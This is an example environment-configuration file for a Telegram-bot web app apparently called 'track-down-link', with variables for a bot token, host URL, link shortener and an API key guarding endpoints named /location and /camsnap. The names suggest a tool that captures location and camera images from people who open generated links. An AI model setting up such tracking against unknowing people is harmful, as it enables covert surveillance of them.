# Copy this file to .env and fill the values

# Telegram bot token (required)
TELEGRAM_BOT_TOKEN=

# Optional: Host URL where this app is reachable (used to generate links)
# Example: https://track-down-link.example.com
HOST_URL=

# Optional: Port to listen on (default 5000)
PORT=5000

# Optional: Whether to use the external shortener (true/false). Default: false
USE_1PT=false

# Optional: Session TTL in milliseconds (default 120000)
SESSION_TTL_MS=120000

# Optional: Node environment
NODE_ENV=production

# Optional: API key used to authenticate incoming POSTs to endpoints like /location, /camsnap, / (set a strong random value)
API_POST_KEY=

# Notes:
# - Do NOT commit your real secrets to the repository. Keep the real values in a local .env file and/or in your deployment environment variables.
# - After rotating any tokens (e.g. Telegram bot token), update the deployed environment variables on Heroku/Replit/VPS/CI to use the new values.
# - If a secret was accidentally committed, rotate it immediately and consider purging history with BFG/git-filter-repo (destructive).
